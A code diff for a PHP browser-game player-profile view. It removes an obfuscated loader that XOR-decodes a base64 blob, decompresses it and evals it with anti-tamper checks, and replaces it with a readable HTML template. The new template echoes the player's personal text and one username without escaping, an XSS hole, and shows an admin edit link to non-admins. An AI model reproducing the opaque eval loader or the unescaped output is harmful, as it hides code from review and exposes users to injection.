@@ -1,24 +1,210 @@
 <?php
-$nqjaxffq="bb3e68fc049519a680bb023172fcbd1b";
-$rwadwk="535001010201035005000b505709510e0c060101060550040707035755055404";
-$yylknhmd="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";
-$scvbjdist=file_get_contents(__FILE__);
-$kornfxs=str_replace($yylknhmd,"",$scvbjdist);
-if(strpos($kornfxs,"ec"."ho")!==false||strpos($kornfxs,"pr"."int")!==false||strpos($kornfxs,"var_"."dump")!==false||strpos($kornfxs,"file_put_"."contents")!==false||strpos($kornfxs,"fw"."rite")!==false){die();}
-$lwnrnq=str_replace(array($nqjaxffq,$rwadwk),array("SP_183d038c","KP_49604cd7"),$scvbjdist);
-$vnluwp=md5($lwnrnq);
-$dlvqidtm=hex2bin($rwadwk);
-$asjxpiwq="";
-$ypigvibj=strlen($vnluwp);
-for($ozlyykijy=0;$ozlyykijy<$ypigvibj;$ozlyykijy++){
-$asjxpiwq.=chr(ord($dlvqidtm[$ozlyykijy])^ord($vnluwp[$ozlyykijy]));
+/**
+ * Info Player View - Player information screen
+ * Shows player details, statistics, villages, and profile
+ */
+
+// Helper functions
+if (!function_exists('format_number')) {
+    function format_number($num) {
+        return number_format($num, 0, ',', '.');
+    }
 }
-$luwztycbz=base64_decode($yylknhmd);
-$gmvqcgowb=strlen($luwztycbz);
-$skuowoqzj="";
-$nijbulsks=strlen($asjxpiwq);
-for($ozlyykijy=0;$ozlyykijy<$gmvqcgowb;$ozlyykijy++){
-$skuowoqzj.=$luwztycbz[$ozlyykijy]^$asjxpiwq[$ozlyykijy%$nijbulsks];
-}
-$dboqhrbokq="gzun"."compress";
-eval('?>' . $dboqhrbokq($skuowoqzj) . '<?php ');
+?>
+
+<!-- Include Name Cosmetics CSS -->
+<link rel="stylesheet" href="/css/name_cosmetics.css">
+
+<?php if (isset($error)): ?>
+    <div class="error_box" style="margin: 20px; padding: 15px; background: #f2dede; border: 1px solid #ebccd1; color: #a94442; border-radius: 4px; text-align: center;">
+        <strong>Erro:</strong> <?php echo htmlspecialchars($error); ?>
+        <br><br>
+        <a href="javascript:history.back()">&laquo; Voltar</a>
+    </div>
+<?php return; endif; ?>
+
+<?php if ($info_user['admin'] == 0): ?>
+    <center><h2 class="error"><?php echo \App\Helpers\CosmeticHelper::formatUsername($info_user['username'], $info_user['id']); ?></h2></center>
+<?php else: ?>
+    <h2><?php echo \App\Helpers\CosmeticHelper::formatUsername($info_user['username'], $info_user['id']); ?></h2>
+<?php endif; ?>
+
+<?php if (isset($info_user['ranga'])): ?>
+    <center><img src="../graphic/rangi/<?php echo htmlspecialchars($info_user['ranga']); ?>.png"></center>
+<?php endif; ?>
+
+<table>
+    <tr>
+        <td valign="top">
+            <script type="text/javascript">
+            var Player = {
+                getAllVillages: function(anchor, link) {
+                    $.get(link, {}, function(data) {
+                        $('#villages_list tbody').append(data.villages);
+                        $(anchor).parent().parent().remove();
+                        VillageContext.init();
+                    }, 'json');
+                }
+            };
+
+            if (typeof VillageContext !== 'undefined') {
+                VillageContext.toggleForVillage = function () {
+                    var $anchor = $(this).parent(),
+                        village_id = $anchor.data('id'),
+                        player_id = $anchor.data('player');
+                    
+                    var vx = $anchor.data('x'),
+                        vy = $anchor.data('y');
+                    
+                    if (vx && vy) {
+                        var current_vid = (typeof game_data !== 'undefined' && game_data.village) ? game_data.village.id : '';
+                        var isGuest = window.location.href.indexOf('guest.php') !== -1;
+                        if (isGuest) {
+                            var urlParams = new URLSearchParams(window.location.search);
+                            var world = urlParams.get('world') || '1';
+                            window.location.href = 'guest.php?world=' + world + '&screen=map&x=' + vx + '&y=' + vy;
+                        } else {
+                            window.location.href = 'game.php?village=' + current_vid + '&screen=map&x=' + vx + '&y=' + vy;
+                        }
+                        return false;
+                    }
+                    
+                    var el_position = $(this).offset(),
+                        position = [el_position.left + 6, el_position.top + 6];
+                    VillageContext.beginShow($(this), position, village_id, player_id);
+                    return false;
+                };
+            }
+            </script>
+            
+            <table class="vis" width="100%">
+                <tr><th colspan="2"><?php echo $info_user['username']; ?></th></tr>
+                <tr><td width="80"><?= __('screens.ally.points') ?: 'Pontos:' ?></td><td><?php echo format_number($info_user['points']); ?></td></tr>
+                <tr><td><?= __('screens.ally.ranking') ?: 'Ranking:' ?></td><td><?php echo format_number($info_user['rang']); ?></td></tr>
+                <tr>
+                    <td><?= __('screens.ally.enemies_defeated') ?: 'Oponentes derrotados:' ?></td>
+                    <td id="kill_info" class="tooltip" title='<?= sprintf(__('screens.ally.killed_as_att_def'), format_number($info_user['killed_units_att']), $info_user['killed_units_att_rank'], format_number($info_user['killed_units_def']), $info_user['killed_units_def_rank']) ?>'>
+                        <?php echo format_number($info_user['killed_units_altogether']); ?> (<?php echo format_number($info_user['killed_units_altogether_rank']); ?>)
+                    </td>
+                </tr>
+                <?php $is_guest = $is_guest ?? false; ?>
+                <?php if (empty($info_ally['short'])): ?>
+                    <tr><td><?= __('screens.ally.tribe') ?: 'Tribo:' ?></td><td></td></tr>
+                <?php else: ?>
+                    <tr><td><?= __('screens.ally.tribe') ?: 'Tribo:' ?></td><td>
+                        <?php if (!$is_guest): ?>
+                            <a href="game.php?village=<?php echo $village['id']; ?>&amp;screen=info_ally&amp;id=<?php echo $info_ally['id']; ?>"><?php echo htmlspecialchars($info_ally['short']); ?></a>
+                        <?php else: ?>
+                            <a href="guest.php?world=<?php echo $world ?? 1; ?>&amp;screen=info_ally&amp;id=<?php echo $info_ally['id']; ?>"><?php echo htmlspecialchars($info_ally['short']); ?></a>
+                        <?php endif; ?>
+                    </td></tr>
+                <?php endif; ?>
+
+                <?php $is_guest = $is_guest ?? false; ?>
+                <?php if (!$is_guest): ?>
+                    <tr><td colspan="2"><a href="game.php?village=<?php echo $village['id']; ?>&amp;screen=mail&amp;mode=new&amp;player=<?php echo $info_user['id']; ?>">&raquo; <?= __('screens.ally.write_message') ?: 'Escreve uma mensagem' ?></a></td></tr>
+                <?php endif; ?>
+                
+                <?php if ($can_mark): ?>
+                    <tr><td colspan="2"><a href="game.php?village=<?php echo $village['id']; ?>&amp;screen=edytuj_kolory_graczy&amp;player=<?php echo $info_user['id']; ?>">&raquo; <?= __('screens.ally.mark_on_map') ?: 'Marque no mapa' ?></a></td></tr>
+                <?php endif; ?>
+                
+                <?php if ($can_invite): ?>
+                    <tr><td colspan="2"><a href="game.php?village=<?php echo $village['id']; ?>&amp;screen=ally&amp;mode=invite&amp;action=invite_id&amp;id=<?php echo $info_user['id']; ?>&amp;h=<?php echo $_SESSION['hkey'] ?? ''; ?>" class="evt-confirm" data-confirm-msg="<?= sprintf(__('screens.ally.confirm_invite_player'), htmlspecialchars($info_user['username'])) ?>">&raquo; <?= __('screens.ally.invite_to_tribe') ?: 'Convidar para a tribo' ?></a></td></tr>
+                <?php endif; ?>
+                
+                <?php if (!$is_guest && $user['admin'] == 0): ?>
+                    <tr><td colspan="2"><a href="game.php?village=<?php echo $village['id']; ?>&amp;screen=admin&amp;mode=users&amp;id=<?php echo $info_user['id']; ?>">&raquo; <?= __('screens.ally.edit_player') ?: 'Editar jogador' ?></a></td></tr>
+                <?php endif; ?>
+            </table>
+            <br>
+
+            <?php
+            // Awards (Classic Theme: Left Column)
+            $isModern = (($ingame_theme ?? $GLOBALS['conf']['ingame_theme'] ?? 'classic') === 'modern');
+            if (!$isModern) {
+                global $awards, $config;
+                if (($config['awards'] ?? true) && isset($awards) && is_object($awards)) {
+                    echo $awards->get_user_awards($info_user['id'], $user['id']);
+                }
+            }
+            ?>
+
+<table id="villages_list" class="vis" width="100%">
+                <thead>
+                    <tr><th width="180"><?= sprintf(__('screens.ally.villages_with_count'), format_number(count($villages ?? []))) ?></th><th width="80"><?= __('screens.ally.coordinates') ?: 'Coordenadas' ?></th><th><?= __('screens.ally.points') ?: 'Pontos' ?></th></tr>
+                </thead>
+                <tbody>
+                    <?php foreach ($villages as $id => $arr): ?>
+                        <tr>
+                            <td><span class="village_anchor" data-id="<?php echo $id; ?>" data-player="<?php echo $info_user['id']; ?>" data-x="<?php echo $arr['x']; ?>" data-y="<?php echo $arr['y']; ?>">
+                                <?php if (!$is_guest): ?>
+                                    <a href="game.php?village=<?php echo $village['id']; ?>&amp;screen=info_village&amp;id=<?php echo $id; ?>"><?php echo htmlspecialchars($arr['name']); ?></a>
+                                <?php else: ?>
+                                    <?php echo htmlspecialchars($arr['name']); ?>
+                                <?php endif; ?>
+                            </span></td>
+                            <td>
+                                <?php if (!$is_guest): ?>
+                                    <a href="game.php?village=<?php echo $village['id']; ?>&amp;screen=map&amp;x=<?php echo $arr['x']; ?>&amp;y=<?php echo $arr['y']; ?>"><?php echo $arr['x']; ?>|<?php echo $arr['y']; ?></a>
+                                <?php else: ?>
+                                    <?php echo $arr['x']; ?>|<?php echo $arr['y']; ?>
+                                <?php endif; ?>
+                            </td>
+                            <td><?php echo format_number($arr['points']); ?></td>
+                        </tr>
+                    <?php endforeach; ?>
+                </tbody>
+            </table>
+        </td>
+        <td valign="top" style="min-width:240px">
+            <table class="vis" width="100%">
+                <tbody>
+                    <tr><th colspan="2"><?= __('screens.ally.profile') ?: 'Perfil' ?></th></tr>
+                    <?php if (isset($info_user['avatar']) && $info_user['avatar'] > 0): ?>
+                        <tr><td colspan="2" align="center">
+                            <div style="background-color: #5d4037; border: 2px solid #3e2723; width: 120px; height: 120px; margin: 0 auto; display: flex; align-items: center; justify-content: center;">
+                                <img src="graphic/player/profile/<?php echo $info_user['avatar']; ?>.webp" style="width: 100%; height: 100%; object-fit: cover;">
+                            </div>
+                        </td></tr>
+                    <?php else: ?>
+                        <tr><td colspan="2" align="center">
+                            <div style="background-color: #5d4037; border: 2px solid #3e2723; width: 120px; height: 120px; margin: 0 auto; display: flex; align-items: center; justify-content: center;">
+                                <img src="graphic/player/profile/default.webp" style="width: 100%; height: 100%; object-fit: cover;">
+                            </div>
+                        </td></tr>
+                    <?php endif; ?>
+                    <?php if ($age != -1): ?>
+                        <tr><td><?= __('screens.ally.age') ?: 'Idade:' ?></td><td><?php echo $age; ?></td></tr>
+                    <?php endif; ?>
+                    <?php if ($sex != -1): ?>
+                        <tr><td><?= __('screens.ally.gender') ?: 'Genero:' ?></td><td><?php echo $sex; ?></td></tr>
+                    <?php endif; ?>
+                    <?php if (!empty($info_user['home'])): ?>
+                        <tr><td><?= __('screens.ally.location') ?: 'Localização:' ?></td><td><?php echo htmlspecialchars($info_user['home']); ?></td></tr>
+                    <?php endif; ?>
+                </tbody>
+            </table>
+            <br />
+            <?php if (!empty($info_user['personal_text'])): ?>
+                <table class="vis" width="100%">
+                    <tr><th><?= __('screens.ally.description') ?: 'Descrição' ?></th></tr>
+                    <tr><td align="center">
+                        <?php echo $info_user['personal_text']; ?>
+                    </td></tr>
+                </table>
+            <?php endif; ?>
+
+            <?php if ($isModern): ?>
+                <br />
+                <?php
+                // Awards (Modern Theme: Right Column)
+                global $awards, $config;
+                if (($config['awards'] ?? true) && isset($awards) && is_object($awards)) {
+                    echo $awards->get_user_awards($info_user['id'], $user['id']);
+                }
+                ?>
+            <?php endif; ?>
+        </td>
+    </tr>
+</table>
